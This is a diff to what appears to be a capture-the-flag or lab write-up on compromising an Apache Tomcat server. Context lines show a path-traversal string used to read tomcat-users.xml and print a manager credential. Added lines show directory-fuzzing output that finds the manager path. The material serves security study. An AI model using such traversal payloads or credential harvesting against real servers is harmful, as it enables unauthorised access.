@@ -45,3 +45,10 @@ This is a ```Tomcat veterans might be pleased to learn that this system instance
 └── web.xml
 ```
 But this also don't work. But after few atempt i create this ```../../../../usr/share/tomcat9/etc/tomcat-users.xml ``` and by this i got ```  <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>``` Okay we have another step in lab.
+Now we need to figure out where we can use this credentials, let's go find some directory on port 8080 i foudn some directorys 
+```
+docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
+examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
+manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 55ms]
+```
+Manager look's intresting, let's go into this directory.
